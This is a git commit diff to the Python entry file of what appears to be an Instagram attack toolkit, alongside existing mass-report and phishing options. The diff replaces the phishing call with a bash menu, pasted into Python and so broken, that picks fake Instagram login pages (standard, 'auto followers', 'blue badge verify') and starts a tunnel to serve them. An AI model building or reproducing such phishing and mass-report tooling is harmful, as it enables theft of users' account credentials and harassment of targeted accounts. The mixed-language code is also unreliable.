5eea40f48a9eaa58ba3f71a09ddc3e2d61d00b3b
GuptajiiHacker <155041576+GuptajiiHacker@users.noreply.github.com>
2024-02-08 21:30:11 +0530

    Update main.py

--- cmd/main.py
+++ cmd/main.py
@@ -28,7 +28,33 @@ if choice == 1:
 		amount = get_amount()
 		insta_massreport(username, vpn, amount, 1)
 	if choice == 3:
-		insta_phishing()
+		instagram(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option
+
+
+if [[ $ig_option == 1 || $ig_option == 01 ]]; then
+website="instagram"
+tunnel_menu
+elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
+website="ig_followers"
+tunnel_menu
+elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
+website="ig_verify"
+tunnel_menu
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
 elif choice == 2:
 	choice = start_instagram()
 	if choice == 1:
